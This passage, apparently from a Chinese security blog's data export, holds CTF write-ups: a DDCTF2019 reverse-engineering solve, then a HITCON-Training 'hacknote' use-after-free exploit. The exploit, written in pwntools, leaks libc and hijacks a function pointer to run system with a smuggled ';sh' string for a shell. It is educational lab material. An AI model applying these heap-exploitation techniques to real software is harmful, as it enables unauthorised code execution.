class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">bool</span> __<span class=\"function\">fastcall <span class=\"title\">sub_100001E50</span><span class=\"params\">(__int64 myclass)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">bool</span> result; <span class=\"comment\">// al</span></span><br><span class=\"line\">  <span class=\"keyword\">bool</span> v2; <span class=\"comment\">// [rsp+Fh] [rbp-11h]</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v4 )</span><br><span class=\"line\">      v2 = v3 &lt; <span class=\"number\">9</span>;</span><br><span class=\"line\">    result = v2;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v2 )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( **(<span class=\"keyword\">unsigned</span> __int8 **)(myclass + <span class=\"number\">24</span>) == *(<span class=\"keyword\">unsigned</span> __int8 *)(<span class=\"number\">16L</span>L * v3 + myclass + <span class=\"number\">32</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v4 = <span class=\"number\">1</span>;</span><br><span class=\"line\">      (*(<span class=\"keyword\">void</span> (__fastcall **)(__int64))(<span class=\"number\">16L</span>L * v3 + myclass + <span class=\"number\">32</span> + <span class=\"number\">8</span>))(myclass);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果那块内存区域中当前指针指向的位置的标志与相应的常数相同，就执行相应的函数指针的所指向的函数操作。</p>\n<p>最后是需要result字段为1，而result字段为1需要调用sub_10001d30函数。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001D30</span><span class=\"params\">(__int64 a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = *(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)(*(_QWORD *)(a1 + <span class=\"number\">24</span>) + <span class=\"number\">1L</span>L);</span><br><span class=\"line\">  *(_DWORD *)(a1 + <span class=\"number\">176</span>) = result;</span><br><span class=\"line\">  *(_QWORD *)(a1 + <span class=\"number\">24</span>) += <span class=\"number\">5L</span>L;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看起来似乎十分复杂，但我们仔细观察一下那块内存区域。</p>\n<p>可以看到\\xf0, \\xf8, \\xf2, \\xf6这些标志位重复的出现，而在0xc6和0xcc偏移处出两次出现\\xf7，由上述sub_10001d30函数的F5代码看出，在若结构体中的指针指向0xc6处，将会把结构体中的result字段设置为1（因为紧接着\\xf7的一个byte为\\x01）。这时我们悟到，程序中会多次执行\\xf0, \\xf8, \\xf2, \\xf6对应的函数指针的函数操作，直到结构体中0x24处的指针走到0xc6偏移处。此时我们只需要对这四个函数进行逆向即可，下面给出这4个函数算法的Python实现。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func0</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x10</span>:</span><br><span class=\"line\">\t\tnum0 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x11</span>:</span><br><span class=\"line\">\t\tnum4 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x12</span>:</span><br><span class=\"line\">\t\tnum8 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x13</span>:</span><br><span class=\"line\">\t\tnum12 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x14</span>:</span><br><span class=\"line\">\t\tnum0 = input_str[cur]</span><br><span class=\"line\">\tindex += <span class=\"number\">6</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func2</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num0 == input_str[cur]:\t</span><br><span class=\"line\">\t\tflag = <span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tflag = <span class=\"number\">0</span></span><br><span class=\"line\">\tindex += <span class=\"number\">2</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func6</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> flag == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tflag = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tindex += magic[index + <span class=\"number\">1</span>]</span><br><span class=\"line\">\tindex += <span class=\"number\">2</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func8</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num0 &gt;= <span class=\"number\">0x41</span> <span class=\"keyword\">and</span> num0 &lt;= <span class=\"number\">0x5a</span>:</span><br><span class=\"line\">\t\tv5 = (<span class=\"number\">2</span> + num0 - <span class=\"number\">65</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span></span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> num0 &gt;= <span class=\"number\">0x61</span> <span class=\"keyword\">and</span> num0 &lt;= <span class=\"number\">0x7a</span>:</span><br><span class=\"line\">\t\tv5 = (<span class=\"number\">2</span> + num0 - <span class=\"number\">97</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tv5 = num0</span><br><span class=\"line\">\tnum0 = v5</span><br><span class=\"line\">\tindex += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>​    实际上，magic bytes中每个\\xf0后面跟的都是0x10，所以我们将每个\\xf0后跟的第二个字节根据func8的逻辑进行变换，即可得到最后的flag。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, mark <span class=\"keyword\">in</span> enumerate(magic):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ord(mark) == <span class=\"number\">0xf0</span> <span class=\"keyword\">and</span> ord(magic[i+<span class=\"number\">1</span>]) == <span class=\"number\">0x10</span>:</span><br><span class=\"line\">\t\tnum = ord(magic[i+<span class=\"number\">2</span>])</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> num &gt;= <span class=\"number\">0x41</span> <span class=\"keyword\">and</span> num &lt;= <span class=\"number\">0x5a</span>:</span><br><span class=\"line\">\t\t\tnum = (<span class=\"number\">2</span> + num - <span class=\"number\">65</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">elif</span> num &gt;= <span class=\"number\">0x61</span> <span class=\"keyword\">and</span> num &lt;= <span class=\"number\">0x7a</span>:</span><br><span class=\"line\">\t\t\tnum = (<span class=\"number\">2</span> + num - <span class=\"number\">97</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tnum = num</span><br><span class=\"line\">\t\tflag += chr(num)</span><br><span class=\"line\"><span class=\"keyword\">print</span> flag</span><br></pre></td></tr></table></figure>\n<p>flag如下：<br>DDCTF{helloYouGotTheFlag}</p>\n","text":"本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。Pwnpwn只有一道题目St","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"},{"name":"RE","slug":"RE","count":2,"path":"api/tags/RE.json"}]},{"title":"HITCON_training题解(二)","slug":"HITCON-training-2","date":"2019-04-10T06:47:59.000Z","updated":"2019-04-10T06:58:06.000Z","comments":true,"path":"api/articles/HITCON-training-2.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"Lab10——hacknote\"><a href=\"#Lab10——hacknote\" class=\"headerlink\" title=\"Lab10——hacknote\"></a>Lab10——hacknote</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checksec hacknote</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab10/hacknote&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>本题是一道典型的堆菜单题，共有4个选项</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. Add note          </span><br><span class=\"line\">2. Delete note       </span><br><span class=\"line\">3. Print note        </span><br><span class=\"line\">4. Exit</span><br></pre></td></tr></table></figure>\n<h4 id=\"add-note\"><a href=\"#add-note\" class=\"headerlink\" title=\"add note\"></a>add note</h4><p>逆向可以得到note的结构如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct note&#123;</span><br><span class=\"line\">\tDWORD *funcptr;</span><br><span class=\"line\">\tDWORD *content;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>每次执行add note操作会malloc两个chunk，首先会malloc(0x8)存储note结构体，将指针存在bss段的全局指针数组notelist；然后会根据输入的size，malloc(size)的chunk，并向其中读入size大小的数据。一个指向print_note_content函数的函数指针funcptr和指向存储数据的chunk的指针content会被存储在note结构体中。</p>\n<h4 id=\"del-note\"><a href=\"#del-note\" class=\"headerlink\" title=\"del note\"></a>del note</h4><p>首先读入符合要求的index，如果相应的数组项不为NULL，就会<em>依次free掉存储content的chunk和存储note的chunk</em>。注意这里存在UAF漏洞，并没有将notelist上存储的指向note的野指针置为NULL，所以即使在free后我们也可以任意的对这些指针进行解引用。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> <span class=\"title\">del_note</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt;= count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( notelist[v1] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)notelist[v1] + <span class=\"number\">1</span>)); &lt;= uaf vul</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(notelist[v1]);\t\t\t\t\t\t\t\t\t&lt;= uaf vul</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Success\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"print-note\"><a href=\"#print-note\" class=\"headerlink\" title=\"print note\"></a>print note</h4><p>该功能中会调用note结构体中存储的print_note_content函数指针，打印出content的内容。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( notelist[v1] )</span><br><span class=\"line\">  (*(<span class=\"keyword\">void</span> (__cdecl **)(<span class=\"keyword\">void</span> *))notelist[v1])(notelist[v1]);</span><br><span class=\"line\"><span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">print_note_content</span><span class=\"params\">(<span class=\"keyword\">int</span> a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(*(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **)(a1 + <span class=\"number\">4</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>实际上，该题中预留了一个magic函数，直接劫持函数指针到magic函数就可以实现利用。为了实现劫持，我们需要构造一个类型混淆的效果，即能够向note结构体里写内容。因为我们只能向content结构体写，所以我们需要利用uaf漏洞构造一个类似的效果。</p>\n<p>首先malloc两个size为0x10的note，然后del掉index0的chunk，此时size为0x8的fastbin中有两个chunk，size为0x10的fastbin中有两个chunk。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd -&gt; note2(chunk2)-&gt;note(chunk0)</span><br><span class=\"line\">fd -&gt; content2(chunk3) -&gt; content(chunk1)</span><br></pre></td></tr></table></figure>\n<p>然后再malloc一个size为0x8的note，就会将两个size为0x8的chunk从fastbin上取下来，而chunk0则作为index2的content，也就是index0的note。所以我们就可以通过向index2的content中写来修改index0的note，也就可以劫持函数指针了。</p>\n<p>利用代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">magic = <span class=\"number\">0x8048986</span></span><br><span class=\"line\">add(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(magic) + p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"提高\"><a href=\"#提高\" class=\"headerlink\" title=\"提高\"></a>提高</h3><p>我们给该题加大难度，假设不存在magic函数，或者说我们想要直接RCE执行任意指令，那应该怎么办呢？</p>\n<p>第一步应该是leak libc，我们可以利用和上述类似的思路，将函数指针覆盖为原来的print_note_content函数，将content覆盖为got表的指针，从而leak出got表。</p>\n<p>第二步是将函数指针覆盖为system，将content覆盖为/bin/sh，然后getshell。</p>\n<p>这里有两个难点：</p>\n<ul>\n<li>因为这道菜单题没有edit函数，所以我们可以直接free掉那两个0x8的chunk然后在重新申请的时候布置堆块内容即可。</li>\n<li>如果直接输入/bin/sh，由于前面有一些杂乱的数据，会使得shell命令执行失败。我们可以用”||”或者”;”截断，然后直接用sh即可。因为有些环境中，/bin本来就在环境变量中，所以直接用sh也可以。这里如果用<code>;/bin/sh\\x00</code>，就会超过8个byte，所以我们只能用<code>;sh\\x00</code>碰碰运气。幸运的是，我们成功了。</li>\n</ul>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./hacknote\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./hacknote\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"size :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(len(content)))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Content :\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">print_ = <span class=\"number\">0x804865b</span></span><br><span class=\"line\">got = elf.got[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">add(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(print_) + p32(got)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">del_note(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload = p32(system) + <span class=\"string\">\";sh\\x00\"</span></span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab11——Bamboobox\"><a href=\"#Lab11——Bamboobox\" class=\"headerlink\" title=\"Lab11——Bamboobox\"></a>Lab11——Bamboobox</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>该题终于是一道64位的题了，仍旧开启了canary和nx，没有开启pie。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab11$ checksec bamboobox</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab11/bamboobox&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>仍旧是标准菜单题，该题有五个功能，即增删改查和退出。</p>\n<p>该题漏洞位于change_item函数中：</p>\n<p>虽然在申请chunk的时候是根据输入的size进行malloc操作，但并没有存储size，所以在change的时候未对size进行校验，而是根据此次指定的长度对堆进行写入，也就是存在一个潜在的堆任意写漏洞。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">change_item</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v0; <span class=\"comment\">// ST08_4</span></span><br><span 